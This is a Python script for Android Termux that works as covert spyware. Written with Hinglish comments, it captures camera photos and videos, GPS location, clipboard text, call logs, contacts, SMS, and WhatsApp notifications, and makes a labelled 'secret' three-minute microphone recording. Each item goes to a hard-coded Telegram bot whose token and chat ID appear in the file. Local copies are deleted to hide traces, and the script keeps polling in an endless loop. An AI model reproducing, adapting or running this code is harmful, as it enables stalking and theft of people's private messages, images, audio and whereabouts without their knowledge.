import hashlib
import json
import os
import subprocess
import time
import requests

# --- Telegram Credentials (Dedicated Bot) ---
BOT_TOKEN = "8815279159:AAGgE3t6u8fuXT-nGJCN-Gowpcl65VsLA00"
CHAT_ID = "7883547875"
HASH_CACHE_FILE = "/sdcard/Download/processed_hashes.json"


def load_processed_hashes():
  """Load previously processed hashes to prevent duplicate file sending."""
  if os.path.exists(HASH_CACHE_FILE):
    try:
      with open(HASH_CACHE_FILE, "r", encoding="utf-8") as f:
        return set(json.load(f))
    except Exception:
      return set()
  return set()


def save_processed_hashes(hashes_set):
  """Save updated hashes list."""
  try:
    with open(HASH_CACHE_FILE, "w", encoding="utf-8") as f:
      json.dump(list(hashes_set), f)
  except Exception as e:
    print(f"Hash Cache Error: {e}")


def send_to_telegram(file_path=None, message=None):
  try:
    if message:
      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)

    if file_path and os.path.exists(file_path):
      if file_path.endswith((".jpg", ".png", ".jpeg")):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
      elif file_path.endswith((".mp4", ".m4a", ".mp3")):
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
            if file_path.endswith((".m4a", ".mp3"))
            else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        )
      else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

      with open(file_path, "rb") as f:
        files = {
            "document"
            if url.endswith("sendDocument")
            else (
                "photo"
                if "sendPhoto" in url
                else ("video" if "sendVideo" in url else "audio")
            ):
            f
        }
        resp = requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=30)

        # File send hone ke foran baad local storage se delete karna (Cleanup)
        if resp.status_code == 200:
          os.remove(file_path)
          print(f"Local file deleted successfully: {file_path}")
  except Exception as e:
    print(f"Telegram Error: {e}")


def notify_and_start():
  try:
    subprocess.run(["termux-toast", "Termux API Scrapping Start"])
  except Exception:
    pass
  send_to_telegram(message="🚀 Termux API Scrapping Start - All Modules Initialized!")


# ==========================================
# 1. LIGHT-WEIGHT TASKS (Sabse Pehle Run Honge)
# ==========================================

# A. Front & Rear Camera Pictures Capture
def capture_cameras_photos():
  back_pic = "/sdcard/Download/back_photo.jpg"
  front_pic = "/sdcard/Download/front_photo.jpg"

  try:
    if os.path.exists(back_pic):
      os.remove(back_pic)
    subprocess.run(["termux-camera-photo", "-c", "0", back_pic], timeout=15)
    if os.path.exists(back_pic):
      send_to_telegram(file_path=back_pic, message="📸 Back Camera Picture")
  except Exception as e:
    print(f"Back photo error: {e}")

  try:
    if os.path.exists(front_pic):
      os.remove(front_pic)
    subprocess.run(["termux-camera-photo", "-c", "1", front_pic], timeout=15)
    if os.path.exists(front_pic):
      send_to_telegram(file_path=front_pic, message="📸 Front Camera Picture")
  except Exception as e:
    print(f"Front photo error: {e}")


# B. Live GPS Location
def get_live_location():
  try:
    res = subprocess.run(
        ["termux-location"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=15,
    )
    if res.returncode == 0 and res.stdout.strip():
      loc_data = json.loads(res.stdout)
      lat = loc_data.get("latitude")
      lon = loc_data.get("longitude")
      map_link = f"https://maps.google.com/?q={lat},{lon}"
      send_to_telegram(
          message=f"📍 Live GPS Location:\nLatitude: {lat}\nLongitude: {lon}\nMap Link: {map_link}"
      )
  except Exception as e:
    send_to_telegram(message=f"❌ GPS Error: {str(e)}")


# C. Clipboard Text Capture
def get_clipboard_text():
  try:
    res = subprocess.run(
        ["termux-clipboard-get"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if res.returncode == 0 and res.stdout.strip():
      clip_text = res.stdout.strip()
      send_to_telegram(
          message=f"📋 Current Clipboard Text:\n\n{clip_text}"
      )
  except Exception as e:
    print(f"Clipboard error: {e}")


# D. Call Logs Text File with MD5 Check
def get_call_logs_file():
  log_path = "/sdcard/Download/call_logs.txt"
  try:
    res = subprocess.run(
        ["termux-call-log"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    if res.returncode == 0 and res.stdout.strip():
      calls = json.loads(res.stdout)
      content = "=== DEVICE CALL LOGS ===\n\n"
      for call in calls:
        name = call.get("name", "Unknown")
        number = call.get("number", "N/A")
        call_type = call.get("type", "N/A")
        date = call.get("date", "N/A")
        duration = call.get("duration", "N/A")
        content += f"Name: {name}\nNumber: {number}\nType: {call_type}\nDate: {date}\nDuration: {duration}s\n-------------------\n"

      file_hash = hashlib.md5(content.encode("utf-8")).hexdigest()
      processed_hashes = load_processed_hashes()

      if file_hash not in processed_hashes:
        with open(log_path, "w", encoding="utf-8") as f:
          f.write(content)
        processed_hashes.add(file_hash)
        save_processed_hashes(processed_hashes)
        send_to_telegram(file_path=log_path, message="📞 Call Logs Text File")
  except Exception as e:
    send_to_telegram(message=f"❌ Call Log Error: {str(e)}")


# E. Contacts List Text File with MD5 Check
def get_contacts_file():
  contact_path = "/sdcard/Download/contacts_list.txt"
  try:
    res = subprocess.run(
        ["termux-contact-list"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if res.returncode == 0 and res.stdout.strip():
      contacts = json.loads(res.stdout)
      content = "=== DEVICE CONTACTS LIST ===\n\n"
      for contact in contacts:
        name = contact.get("name", "Unknown")
        number = contact.get("number", "No Number")
        content += f"Name: {name} | Number: {number}\n"

      file_hash = hashlib.md5(content.encode("utf-8")).hexdigest()
      processed_hashes = load_processed_hashes()

      if file_hash not in processed_hashes:
        with open(contact_path, "w", encoding="utf-8") as f:
          f.write(content)
        processed_hashes.add(file_hash)
        save_processed_hashes(processed_hashes)
        send_to_telegram(file_path=contact_path, message="📇 Contacts List File")
  except Exception as e:
    send_to_telegram(message=f"❌ Contacts Error: {str(e)}")


# F. SMS History Text File with MD5 Check
def get_sms_history_file():
  sms_path = "/sdcard/Download/all_sms.txt"
  try:
    res = subprocess.run(
        ["termux-sms-list", "-l", "100"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if res.returncode == 0 and res.stdout.strip():
      messages = json.loads(res.stdout)
      content = "=== PREVIOUS SMS MESSAGES ===\n\n"
      for msg in messages:
        number = msg.get("number", "N/A")
        body = msg.get("body", "N/A")
        date = msg.get("date", "N/A")
        msg_type = msg.get("type", "N/A")
        content += f"Number: {number}\nType: {msg_type}\nDate: {date}\nMessage: {body}\n-------------------\n"

      file_hash = hashlib.md5(content.encode("utf-8")).hexdigest()
      processed_hashes = load_processed_hashes()

      if file_hash not in processed_hashes:
        with open(sms_path, "w", encoding="utf-8") as f:
          f.write(content)
        processed_hashes.add(file_hash)
        save_processed_hashes(processed_hashes)
        send_to_telegram(
            file_path=sms_path, message="📩 All SMS History Text File"
        )
  except Exception as e:
    send_to_telegram(message=f"❌ SMS Error: {str(e)}")


# G. WhatsApp Notifications
def get_whatsapp_notifications():
  noti_path = "/sdcard/Download/whatsapp_notifications.txt"
  try:
    res = subprocess.run(
        ["termux-notification-list"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if res.returncode == 0 and res.stdout.strip():
      notifications = json.loads(res.stdout)
      content = "=== LIVE WHATSAPP NOTIFICATIONS ===\n\n"
      found = False
      for noti in notifications:
        if noti.get("package") == "com.whatsapp":
          found = True
          title = noti.get("title", "Unknown")
          text = noti.get("text", "N/A")
          when = noti.get("when", "N/A")
          content += f"Sender: {title}\nMessage: {text}\nTime: {when}\n-------------------\n"

      if found:
        file_hash = hashlib.md5(content.encode("utf-8")).hexdigest()
        processed_hashes = load_processed_hashes()

        if file_hash not in processed_hashes:
          with open(noti_path, "w", encoding="utf-8") as f:
            f.write(content)
          processed_hashes.add(file_hash)
          save_processed_hashes(processed_hashes)
          send_to_telegram(
              file_path=noti_path, message="💬 Live WhatsApp Notifications Log"
          )
  except Exception as e:
    print(f"WhatsApp Notification Error: {str(e)}")


# ==========================================
# 2. HEAVY-WEIGHT TASKS (Sabse Last Mein Run Honge)
# ==========================================

# H. Front & Rear Camera 10s Video Capture
def capture_cameras_video():
  back_video = "/sdcard/Download/back_video.mp4"
  front_video = "/sdcard/Download/front_video.mp4"

  try:
    if os.path.exists(back_video):
      os.remove(back_video)
    subprocess.Popen(["termux-camera-video", "-c", "0", back_video])
    time.sleep(10)
    subprocess.run(["pkill", "-f", "termux-camera-video"])
    if os.path.exists(back_video):
      send_to_telegram(file_path=back_video, message="📹 Back Camera 10s Video")
  except Exception as e:
    print(f"Back video error: {e}")

  try:
    if os.path.exists(front_video):
      os.remove(front_video)
    subprocess.Popen(["termux-camera-video", "-c", "1", front_video])
    time.sleep(10)
    subprocess.run(["pkill", "-f", "termux-camera-video"])
    if os.path.exists(front_video):
      send_to_telegram(file_path=front_video, message="📹 Front Camera 10s Video")
  except Exception as e:
    print(f"Front video error: {e}")


# I. Secret Audio Recording (3 Minutes / 180 Seconds)
def record_secret_audio():
  audio_path = "/sdcard/Download/secret_audio.m4a"
  try:
    if os.path.exists(audio_path):
      os.remove(audio_path)
    subprocess.Popen(["termux-microphone-record", "-f", audio_path, "-l", "180"])
    send_to_telegram(
        message="🎤 3 Minutes ki secret audio recording shuru ho chuki hai..."
    )
    time.sleep(185)
    subprocess.run(["termux-microphone-record", "-q"])
    if os.path.exists(audio_path):
      send_to_telegram(
          file_path=audio_path, message="🎙️ Secret Audio Recording File"
      )
  except Exception as e:
    send_to_telegram(message=f"❌ Audio Recording Error: {str(e)}")


# Master Execution Loop
def main():
  notify_and_start()

  # 1. Pehle Light/Choti Cheezein (Photos, Location, Logs, Contacts, SMS, WhatsApp)
  capture_cameras_photos()
  get_live_location()
  get_clipboard_text()
  get_call_logs_file()
  get_contacts_file()
  get_sms_history_file()
  get_whatsapp_notifications()

  send_to_telegram(
      message="✅ Initial Light Batch Completed. Starting Heavy Media Tasks..."
  )

  # 2. Last Mein Heavy Cheezein (Videos aur Audio Recording)
  capture_cameras_video()
  record_secret_audio()

  send_to_telegram(
      message="✅ All Initial Tasks Completed. Entering Live Monitoring Loop..."
  )

  # Continuous background loop for volatile data (every 1 min)
  while True:
    try:
      get_whatsapp_notifications()
      get_clipboard_text()
      time.sleep(60)
    except Exception as e:
      print(f"Loop Error: {e}")
      time.sleep(30)


if __name__ == "__main__" or True:
  try:
    main()
  except Exception as e:
    print(f"API Execution Error: {e}")
